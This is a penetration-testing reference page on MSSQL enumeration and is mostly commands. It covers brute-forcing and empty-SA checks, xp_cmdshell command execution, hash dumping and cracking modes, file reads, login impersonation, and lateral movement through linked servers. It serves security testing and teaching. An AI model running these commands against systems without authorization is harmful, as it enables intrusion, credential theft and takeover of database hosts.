% Filename: 02-reconnaissance/enum-database/mssql.md
% Display name: MSSQL Enumeration
% Last update: 2026-02-09
% ATT&CK Tactics: TA0043 (Reconnaissance)
% ATT&CK Techniques: T1595 (Active Scanning)
% Authors: @TristanInSec

# MSSQL Enumeration

## Overview

MSSQL runs on TCP 1433 (default instance) and UDP 1434 (SQL Browser for named instances). Dynamic ports are common when multiple instances run on the same host. Enumeration targets instance discovery, version detection, authentication testing, and privilege assessment. MSSQL is deeply integrated with Windows authentication — domain credentials often grant database access, and database access can lead to OS command execution via `xp_cmdshell`.

## ATT&CK Mapping

- **Tactic:** TA0043 - Reconnaissance
- **Technique:** T1595 - Active Scanning

## Prerequisites

- Network access to target TCP 1433 or dynamic ports
- `impacket-mssqlclient`, `sqsh`, Nmap, or NetExec installed

## Enumeration Techniques

### Service Detection

```bash
# Nmap
# https://nmap.org/
nmap -sV -p 1433 <target>

# Discover named instances via SQL Browser (UDP 1434)
nmap -sU -p 1434 --script ms-sql-info <target>
```

The SQL Browser service on UDP 1434 reveals all running instances, their versions, and TCP ports — even non-default ports.

### Nmap NSE Scripts

```bash
# Nmap
# https://nmap.org/
# Server information and version
nmap -p 1433 --script ms-sql-info <target>

# Check for empty SA password
nmap -p 1433 --script ms-sql-empty-password <target>

# NTLM info extraction (hostname, domain)
nmap -p 1433 --script ms-sql-ntlm-info <target>

# Enumerate databases (requires creds)
nmap -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.password='' <target>

# Dump password hashes (requires SA)
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password='' <target>

# Execute a query
nmap -p 1433 --script ms-sql-query --script-args "mssql.username=sa,mssql.password='',ms-sql-query.query='SELECT @@version'" <target>

# Attempt command execution via xp_cmdshell
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args "mssql.username=sa,mssql.password='',ms-sql-xp-cmdshell.cmd='whoami'" <target>

# Brute-force
nmap -p 1433 --script ms-sql-brute <target>

# Run all MSSQL scripts
nmap -p 1433 --script "ms-sql-*" --script-args mssql.instance-port=1433 <target>
```

### Impacket mssqlclient

```bash
# Impacket mssqlclient
# https://github.com/fortra/impacket
# SQL authentication
impacket-mssqlclient <user>:<password>@<target>

# Windows authentication
impacket-mssqlclient <domain>/<user>:<password>@<target> -windows-auth

# SA with empty password
impacket-mssqlclient sa:''@<target>
```

Once connected:

```sql
-- Server version
SELECT @@version;

-- Current user
SELECT SYSTEM_USER;
SELECT USER_NAME();

-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- List databases
SELECT name FROM sys.databases;

-- List tables in a database
SELECT * FROM <database>.INFORMATION_SCHEMA.TABLES;

-- List logins
SELECT name, type_desc, is_disabled FROM sys.server_principals;

-- List linked servers (pivot opportunities)
EXEC sp_linkedservers;
SELECT * FROM sys.servers;
```

### xp_cmdshell (Command Execution)

If the user is `sysadmin`, `xp_cmdshell` provides OS command execution:

```sql
-- Check if xp_cmdshell is enabled
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';

-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'dir C:\Users';
```

In `impacket-mssqlclient`, the shortcut is:

```text
SQL > enable_xp_cmdshell
SQL > xp_cmdshell whoami
```

### File Read/Write

```sql
-- Read a file using OPENROWSET (requires ad hoc distributed queries or linked server)
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;

-- Write via xp_cmdshell
EXEC xp_cmdshell 'echo test > C:\temp\test.txt';
```

### Credential Extraction

```sql
-- Dump SQL logins with hashes (sysadmin required)
SELECT name, password_hash FROM sys.sql_logins;
```

MSSQL password hashes use the `mssql` format — crackable with Hashcat (mode 1731 for MSSQL 2012+, mode 132 for MSSQL 2005, mode 131 for MSSQL 2000).

### Impersonation

```sql
-- Check who can be impersonated
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate another user
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
```

### NetExec MSSQL Module

```bash
# NetExec
# https://github.com/Pennyw0rth/NetExec
# Test credentials
nxc mssql <target> -u <user> -p <password>

# Windows authentication
nxc mssql <target> -u <user> -p <password> -d <domain>

# Execute a query
nxc mssql <target> -u <user> -p <password> -q "SELECT @@version"

# Execute OS command via xp_cmdshell
nxc mssql <target> -u <user> -p <password> -x "whoami"

# Scan subnet
nxc mssql <network>/24 -u <user> -p <password>
```

### Metasploit Modules

```bash
# Metasploit
# https://www.metasploit.com/
# Instance discovery
auxiliary/scanner/mssql/mssql_ping

# Login testing
auxiliary/scanner/mssql/mssql_login

# Enumeration
auxiliary/admin/mssql/mssql_enum

# Schema dump
auxiliary/scanner/mssql/mssql_schemadump

# Hash dump
auxiliary/scanner/mssql/mssql_hashdump

# Command execution via xp_cmdshell
auxiliary/admin/mssql/mssql_exec
```

## Post-Enumeration

With MSSQL access, prioritize:
- Check sysadmin role — if yes, `xp_cmdshell` gives OS command execution immediately
- Password hashes from `sys.sql_logins` for offline cracking
- Linked servers for lateral movement to other SQL instances
- Impersonation opportunities to escalate from low-privilege to sysadmin
- Credential reuse — test SQL passwords against SMB, RDP, WinRM
- Database contents — application credentials, connection strings, user data

## References

### Official Documentation

- [Nmap ms-sql-info NSE Script](https://nmap.org/nsedoc/scripts/ms-sql-info.html)
- [Nmap ms-sql-brute NSE Script](https://nmap.org/nsedoc/scripts/ms-sql-brute.html)
- [Impacket — mssqlclient.py](https://github.com/fortra/impacket)
- [NetExec](https://github.com/Pennyw0rth/NetExec)

### Pentest Guides & Research

- [NetSPI — Hacking SQL Server Stored Procedures Part 2: User Impersonation](https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
- [NetSPI — SQL Server Link Crawling with PowerUpSQL](https://blog.netspi.com/sql-server-link-crawling-powerupsql/)
- [NetSPI — PowerUpSQL: A PowerShell Toolkit for Attacking SQL Server](https://github.com/NetSPI/PowerUpSQL)
- [r-tec Cyber Security — MSSQL Exploitation: Run Commands Like A Pro](https://www.r-tec.net/r-tec-blog-mssql-exploitation-run-commands-like-a-pro.html)
- [Hacking Articles — Pentesting MSSQL with Metasploit](https://www.hackingarticles.in/mssql-for-pentester-metasploit/)
- [Hacking Articles — MSSQL Command Execution with xp_cmdshell](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/)

### MITRE ATT&CK

- [T1595 — Active Scanning](https://attack.mitre.org/techniques/T1595/)
